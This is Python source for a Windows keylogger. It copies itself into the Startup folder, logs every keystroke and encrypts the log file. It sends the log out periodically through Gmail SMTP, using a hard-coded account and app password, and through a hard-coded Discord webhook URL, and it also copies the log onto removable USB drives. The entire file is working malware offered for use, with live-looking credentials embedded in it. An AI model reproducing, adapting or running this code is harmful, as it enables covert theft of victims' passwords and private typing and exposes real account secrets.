import os  # OS operations
from pynput import keyboard  # Keylogger
import smtplib  # Email
import threading  # Multi-threading
import time  # For sleep
import shutil  # File operations
import requests  # Discord webhook
import psutil  # USB detection
from cryptography.fernet import Fernet  # Encryption

# === Auto-start setup ===
startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
script_path = os.path.realpath(__file__)
shutil.copy(script_path, startup_path)

# === Key management ===
key_file_path = "secret.key"
if not os.path.exists(key_file_path):
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as key_file:
        key_file.write(key)
else:
    with open(key_file_path, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)
LOG_FILE = "log.txt"

# === Keylogger functions ===
def on_press(key):
    with open(LOG_FILE, "a") as file:
        try:
            file.write(f"{key.char}\n")
        except AttributeError:
            file.write(f"[{key.name}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# === Exfiltration via email ===
def exfiltrate_via_email(file_path):
    from_address = "iyazibilibana07@gmail.com"
    to_address = "asekhomthethandaba@gmail.com"
    from_password = "pzcg tgfu ehyd nzes"
    subject = "System Report"

    with open(file_path, "rb") as file:
        message = file.read()
    msg = f"Subject: {subject}\n\n{message}"

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(from_address, from_password)
        server.sendmail(from_address, to_address, msg)
        server.quit()

# === Exfiltration via Discord ===
def exfiltrate_via_discord(file_path):
    webhook_url = "https://discord.com/api/webhooks/1373857531377618995/_SwQDhSBLjI3TtnrURMpukWARhxTkVarOYMcFT7no6msR-BJQImQsPd-EjsNc-0W7RhG"

    with open(file_path, "r") as file:
        log_content = file.read()

    data = {"content": f"```{log_content}```"}

    try:
        requests.post(webhook_url, json=data)
        print("[+] Logs sent to Discord webhook successfully")
    except Exception:
        pass

# === Periodic exfiltration threads ===
def send_logs_via_email_periodically(interval=300):
    while True:
        exfiltrate_via_email(LOG_FILE)
        time.sleep(interval)

def send_logs_to_discord_periodically(interval=300):
    while True:
        exfiltrate_via_discord(LOG_FILE)
        time.sleep(interval)

# === Encryption ===
def encrypt_file(file_path):
    marker = b"Encrypted::"
    with open(file_path, "rb") as file:
        original_data = file.read()
        if original_data.startswith(marker):
            return
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, "wb") as file:
        file.write(marker + encrypted_data)

def encrypt_logs_periodically(file_path):
    while True:
        time.sleep(60)
        encrypt_file(file_path)

# === Decryption (optional) ===
def decrypt_file(file_path, key_file_path="secret.key"):
    with open(key_file_path, "rb") as key_file:
        key = key_file.read()
    fernet = Fernet(key)
    marker = b"Encrypted::"

    with open(file_path, "rb") as file:
        encrypted_data = file.read()

    if encrypted_data.startswith(marker):
        try:
            decrypted_data = fernet.decrypt(encrypted_data[len(marker):])
            with open(file_path, "wb") as file:
                file.write(decrypted_data)
            print(f"[+] Decryption successful: {file_path}")
        except Exception as e:
            print(f"[-] Decryption failed: {e}")
    else:
        print("[*] File is not encrypted (no marker found).")

# === USB exfiltration ===
processed_drives = set()

def exfiltrate_to_usb(log_file_path):
    try:
        with open(log_file_path, "rb") as log_file:
            data = log_file.read()

        for partition in psutil.disk_partitions(all=False):
            if "removable" in partition.opts.lower():
                mountpoint = partition.mountpoint
                if mountpoint not in processed_drives:
                    for root, dirs, files in os.walk(mountpoint):
                        try:
                            dest_path = os.path.join(mountpoint, os.path.basename(log_file_path))
                            with open(dest_path, "wb") as f:
                                f.write(data)
                            print(f"[+] Copied {log_file_path} to {dest_path}")
                            processed_drives.add(mountpoint)
                            break
                        except Exception as e:
                            print(f"[-] Failed to copy {log_file_path}: {e}")
                        break
    except Exception as e:
        print(f"[-] Error opening log file: {e}")

# === Thread starts ===
email_thread = threading.Thread(target=send_logs_via_email_periodically)
email_thread.daemon = True
email_thread.start()

discord_thread = threading.Thread(target=send_logs_to_discord_periodically)
discord_thread.daemon = True
discord_thread.start()

encryption_thread = threading.Thread(target=encrypt_logs_periodically, args=(LOG_FILE,))
encryption_thread.daemon = True
encryption_thread.start()

usb_thread = threading.Thread(target=exfiltrate_to_usb, args=(LOG_FILE,))
usb_thread.daemon = True
usb_thread.start()

# === Start keylogger ===
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
